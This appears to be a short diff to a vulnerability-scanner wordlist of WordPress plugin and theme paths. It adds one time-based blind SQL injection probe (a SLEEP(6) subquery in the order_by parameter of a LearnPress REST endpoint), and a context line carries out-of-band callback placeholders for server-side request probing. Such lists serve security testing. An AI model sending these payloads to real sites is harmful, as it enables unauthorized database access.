@@ -7875,3 +7875,4 @@ test&access={{interactsh-url}}&remote_url={{interactsh-url}}&admin={{interactsh-
 /wp-content/plugins/document/readme.txt
 /wp-content/themes/socialv/style.css
 /wp-content/plugins/super-seo-content-cloner/readme.txt
+/wp-json/lp/v1/courses/archive-course?&order_by=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))X)&limit=-1
